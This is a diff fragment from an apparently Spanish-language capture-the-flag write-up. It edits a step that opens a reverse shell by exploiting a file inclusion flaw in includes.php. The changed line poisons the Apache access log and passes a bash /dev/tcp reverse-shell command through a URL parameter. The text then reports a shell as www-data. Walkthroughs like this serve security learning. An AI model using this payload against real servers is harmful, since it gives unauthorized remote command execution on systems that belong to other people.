@@ -60,7 +60,7 @@ Para conseguir una Shell me copié de [`IronHackers`](https://ironhackers.es/her
 Ahora sí, estamos preparados para lanzar la Reverse Shell:
 
 ```
-http://192.168.1.114/includes.php?display_page=bash -c 'bash -i >%26 /dev/tcp/192.168.1.114/4444 0>%261'
+http://192.168.1.114/includes.php?display_page=/var/log/apache2/access.log&cmd=bash -c 'bash -i >%26 /dev/tcp/192.168.1.114/4444 0>%261'
 ```
 Bien! Hemos recibido una Shell como `www-data`!
 
